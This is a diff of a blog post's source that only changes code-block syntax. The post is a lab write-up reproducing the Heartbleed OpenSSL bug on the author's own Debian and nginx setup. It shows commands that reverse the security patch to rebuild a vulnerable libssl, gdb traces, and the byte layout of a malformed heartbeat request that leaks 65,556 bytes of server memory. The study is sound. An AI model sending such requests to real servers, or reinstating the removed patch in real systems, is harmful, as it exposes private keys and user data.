@@ -29,7 +29,7 @@ alive. The client sends a request  with a payload and the server is supposed
 to reply with the same payload.
 
 
-{% highlight C linenos %}
+```c
 /* Allocate memory for the response, size is 1 bytes
  * message type, plus 2 bytes payload length, plus
  * payload, plus padding
@@ -45,8 +45,7 @@ bp += payload;
 
 /* Random padding */
 RAND_pseudo_bytes(bp, padding);
-
-{% endhighlight %}
+```
 
 *payload* is the length of the payload of the heartbeat request sent from the client. This
 value is read from the heartbeat message itself. *pl* is a pointer to the buffer containing 
@@ -82,7 +81,7 @@ My idea was to try to steal the private keys from my own instance. I am
 running Debian Wheezy 7.1 and, according to apt, the openssl version I have
 installed on my machine is *1.0.1e*.
 
-{% highlight console lineos %}
+```text
 ➜  ~ [1] at 15:48:42 [Sun 1] $ sudo apt-cache policy openssl    
 openssl:
   Installed: 1.0.1e-2+deb7u14
@@ -93,27 +92,26 @@ openssl:
         100 /var/lib/dpkg/status
      1.0.1e-2+deb7u13 0
         500 http://ftp.ch.debian.org/debian/ wheezy/main i386 Packages
-
-{% endhighlight %}
+```
 
 At a first glance, this might seem a vulnerable release, but the output
 of openssl version shows that the package has been compiled in early 2015.
 
-{% highlight console lineos %}
+```text
 ➜  ~ [1] at 15:48:51 [Sun 1] $ openssl version -a
 OpenSSL 1.0.1e 11 Feb 2013
 built on: Thu Jan  8 21:47:50 UTC 2015
 platform: debian-i386-i686/cmov
 options:  bn(64,32) rc4(8x,mmx) des(ptr,risc1,16,long) blowfish(idx) 
 [...]
-{% endhighlight %}
+```
 
 The changelog for *openssl_1.0.1e-2+deb7u14* is available 
 <a href="http://metadata.ftp-master.debian.org/changelogs/main/o/openssl/openssl_1.0.1e-2+deb7u14_changelog" target="_blank">here</a>.
 On April the 7th, heartbleed bug was fixed and a patch was applied to the package
 incrementing the release to deb7u5.
 
-{% highlight console lineos %}
+```text
 openssl (1.0.1e-2+deb7u5) wheezy-security; urgency=high
 
   * Non-maintainer upload by the Security Team.
@@ -124,7 +122,7 @@ openssl (1.0.1e-2+deb7u5) wheezy-security; urgency=high
     server.
 
  -- Salvatore Bonaccorso <carnil@debian.org>  Mon, 07 Apr 2014 22:26:55 +0200
-{% endhighlight %} 
+```
 
 The openssl version installed on my machine is therefore not vulnerable. In order to
 restore the bug, the package must be rebuilt without applying
@@ -132,15 +130,14 @@ the patch. When the source deb file is downloaded, the patches are applied autom
 The easiest way to build a vulnerable package it to apply a reverse patch. The 
 following commands can be used.
 
-
-{% highlight console lineos %}
+```text
 apt-get source openssl
 cd openssl-1.0.1e/debian/patches/
 interdiff CVE-2014-0160.patch /dev/null > hb_reversed.patch
 mv hb_reversed.patch ../../
 cd ../..
 patch -p1 < hb_reversed.patch
-{% endhighlight %}
+```
 
 The patch should apply successfully. The changes must be committed with dpkg-source 
 --commit (it is not possible to compile the new package until then). This will
@@ -158,8 +155,7 @@ Once finished, *openssl\_1.0.1e-2+deb7u14.1\_i386.deb* and related packages will
 available. Heartbleed vulnerability comes from libssl1.0.0 and the package 
 that should be installed is *libssl1.0.0\_1.0.1e-2+deb7u14.1\_i386.deb*.
 
-
- {% highlight console lineos %}
+```text
 ➜  /tmp [1] at 16:32:06 [Sat 7] $ sudo dpkg -i libssl1.0.0_1.0.1e-2+deb7u14.1_i386.deb
 (Reading database ... 203151 files and directories currently installed.)
 Preparing to replace libssl1.0.0:i386 1.0.1e-2+deb7u14.1 (using libssl1.0.0_1.0.1e-2+deb7u14.1_i386.deb) ...
@@ -178,12 +174,12 @@ libssl1.0.0:
         500 http://security.debian.org/ wheezy/updates/main i386 Packages
      1.0.1e-2+deb7u13 0
         500 http://ftp.ch.debian.org/debian/ wheezy/main i386 Packages
-{% endhighlight %}
+```
 
 It is possible to revert to the old clean package by defining a
 specific version on the command line.
 
-{% highlight console lineos %}
+```text
 ➜  /tmp [1] at 16:38:25 [Sat 7] $ sudo apt-get install libssl1.0.0=1.0.1e-2+deb7u14
 Reading package lists... Done
 Building dependency tree       
@@ -200,8 +196,7 @@ dpkg: warning: downgrading libssl1.0.0:i386 from 1.0.1e-2+deb7u14.1 to 1.0.1e-2+
 Preparing to replace libssl1.0.0:i386 1.0.1e-2+deb7u14.1 (using .../libssl1.0.0_1.0.1e-2+deb7u14_i386.deb) ...
 Unpacking replacement libssl1.0.0:i386 ...
 Setting up libssl1.0.0:i386 (1.0.1e-2+deb7u14) ...
-
-{% endhighlight %}
+```
 
 
 nginx installation
@@ -211,7 +206,7 @@ nginx can be configured to enable HTTPS connections by simply adding the followi
 does not clash with other `server` definitions included from */etc/nginx/sites-enabled*.
 The default configuration file is */etc/nginx/nginx.conf*.
 
-{% highlight console %}
+```text
 server {
     listen              443 ssl;
     server_name         localhost;
@@ -222,13 +217,14 @@ server {
             index  index.html index.htm;
     }
 }
-{% endhighlight %}
+```
+
 Heartbeat request
 =================
 The very first step is to try to send a proper hearbeat request to the nginx
 instance.
 
-{% highlight python linenos %}
+```python
 0x18                    # Type: Heartbeat
 0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2) 
 0x00 0x17               # Record length, size of the heartbeat message
@@ -239,8 +235,8 @@ instance.
 0xDA 0xC8 0xFC 0x92     # 
 0x9E 0xEE 0xD4 0x3B     #
 0x93 0xDD 0x7D 0xB5     #
+```
 
-{% endhighlight %}
 It turned out to be a bit more complicated than that. The heartbeat message is sent
 to the server but no response whatsoever is returned. The following picture shows
 that Wireshark decodes properly the SSL record, which means that the message can
@@ -270,9 +266,10 @@ like instruction reordering, loop unrolling, inlining. The easiest way is to sim
 turn off optimizations. CFLAGS used by dpkg can be set in */etc/dpkg/buildflags.conf*.
 In this specific case, the following directive does the job.
 
-{% highlight console %}
+```text
 SET CFLAGS -g -O0 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security  
-{% endhighlight %}
+```
+
 After recompiling  libssl1.0.0, the debugging symbols should be embedded in the library,
 therefore the debug package *libssl1.0.0-dbg\_1.0.1e-2+deb7u14.\_i386* should
 not be necessary. A further simplification which makes the debugging easier is
@@ -284,7 +281,7 @@ in */etc/nginx/nginx.conf*, so that there is just one thread serving the request
 coming from the clients. nginx must be stopped and restarted and gdb can
 then be attached to the worker process.
 
-{% highlight console %}
+```text
 ➜  ~ [1] at 10:15:57 [Thu 12] $ ps aux | grep nginx
 root      5210  0.0  0.0  11980   960 ?        Ss   10:15   0:00 nginx: master process /usr/sbin/nginx
 www-data  5211  0.0  0.0  12144  1356 ?        S    10:15   0:00 nginx: worker process
@@ -300,40 +297,39 @@ This GDB was configured as "i486-linux-gnu".
 For bug reporting instructions, please see:
 <http://www.gnu.org/software/gdb/bugs/>.
 (gdb) attach 5211
-{% endhighlight %}
+```
 
 gdb executes the ptrace system call and starts tracing nginx. It then tries to load the
 symbols of all the shared objects mapped in the address space of the process, including
 libssl.so.1.0.0. If gdb fails to load the symbols for libssl, then something went wrong.
 
-{% highlight console%}
+```text
 Reading symbols from /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0...done.
 Loaded symbols for /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0
-{% endhighlight %}
-
+```
 
 gdb should also be pointed to the location of the source code with the *directory*
 command.
 
-{% highlight console%}
+```text
 (gdb) directory <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl
 Source directories searched: <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl:$cdir:$cwd
-{% endhighlight %}
+```
 
 A breakpoint on *tls1\_process\_heartbeat* can be set and the execution resumed.
 
-{% highlight console%}
+```text
 (gdb) break tls1_process_heartbeat
 Breakpoint 1 at 0xb76c29d4: file t1_lib.c, line 2579.
 (gdb) c
 Continuing.
-{% endhighlight %}
+```
 
 Now, upon receiving a heartbeat message, the code will hit the breakpoint, allowing
 step by step execution.
 
 
-{% highlight console linenos %}
+```text
 Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
 2579        unsigned char *p = &s->s3->rrec.data[0], *pl;
 (gdb) s
@@ -345,8 +341,7 @@ Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
 (gdb) 
 2587        pl = p;
 (gdb)
-
-{% endhighlight %}
+```
 
 The control path which explains why a heartbeat response is not returned
 is not that trivial and without a proper knowledge of the
@@ -354,7 +349,7 @@ library it's difficult to fully grasp what the code does. After
 a series of *step* and *next*, the single step execution led to the function
 *buffer_write* in *bf_buff.c*. 
 
-{% highlight console linenos %}
+```text
 Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
 [...]
 2614            r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
@@ -391,12 +386,12 @@ ssl3_write_bytes (s=0x9910a58, type=24, buf_=0x99609a8, len=23) at s3_pkt.c:584
                 (gdb) 
             BIO_write (b=0x99128b0, in=0x995b8cb, inl=28) at bio_lib.c:249
             249     if (i > 0) b->num_write+=(unsigned long)i;
-{% endhighlight %}
+```
 
 A full trace is available <a href="/includes/hb_trace.txt" target="_blank">here</a>.
 The *buffer_write* function is defined in *crypto/bio/bf_buf.c* as follows.
 
-{% highlight C linenos %}
+```c
 static int buffer_write(BIO *b, const char *in, int inl)
     {
     int i,num=0;
@@ -469,7 +464,7 @@ start:
          * amount left */
         goto start;
         }
-{% endhighlight %}
+```
 
 This function writes the data passed as argument with pointer <em>\*in</em> into
 the buffer pointed by the BIO object <em>\*b</em>. The decision whether to flush or not
@@ -477,17 +472,19 @@ the buffer through the socket is taken based on the size of the data with respec
 the size of the BIO buffer. If the former is smaller than the latter, the buffer is
 not flushed (line 14). The heartbeat response message here is 28 bytes and the buffer is 4KB,
 the data is written on the buffer but not flushed.
-{% highlight console %}
+
+```text
 (gdb) print i
 $1 = 4096
 (gdb) print inl
 $2 = 28
-{% endhighlight %}
+```
 
 What happens if the size of the heartbeat message is bigger than the buffer, say 5000
 bytes? I used <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a> 
 to send a well-formed heartbeat request while tracing *buffer_write*.
-{% highlight console linenos %}
+
+```text
     (gdb) 
     247     i=b->method->bwrite(b,in,inl);
     (gdb) s
@@ -534,7 +531,7 @@ to send a well-formed heartbeat request while tracing *buffer_write*.
     249     if (i > 0) b->num_write+=(unsigned long)i;
     (gdb) print i
     $5 = 5000
- {% endhighlight  %}
+```
 
 The loop at line 54 writes 5000 bytes in the output buffer, which is then flushed through 
 the socket; the client receives a well-formed heartbeat response with a payload
@@ -551,14 +548,14 @@ Heartbleed request
 A malformed hearbeat request features a payload size which does not match the actual
 lenght of the data carried inside the message.
 
-{% highlight console %}
+```python
 0x18                    # Type: Heartbeat
 0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2) 
 0x00 0x03               # Record length, size of the heartbeat message
 0x01                    # heartbeat message type: request
 0xFF 0xFF               # Payload size, does not match the actual size of the payload
                         # No payload
-{% endhighlight %}
+```
 
 Due to the lack of checks on the payload size, the server returns 65536 bytes 
 copied from the address space of the process: <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a>
@@ -566,13 +563,13 @@ can be adapted to send a malformed request. The heartbeat response message conta
 of payload, 16 bytes of padding and 4 bytes of header, 65556 in total.
 
 
-{% highlight console %}
+```text
 ➜  ~/heartbleed [1] at 12:35:56 [Thu 12] $ ./send_heartbleed
 Initializing new connection...
 Connecting...
 Connected!
 resplen:  65556
-{% endhighlight %}
+```
 
 Scanning leaked memory
 =============================
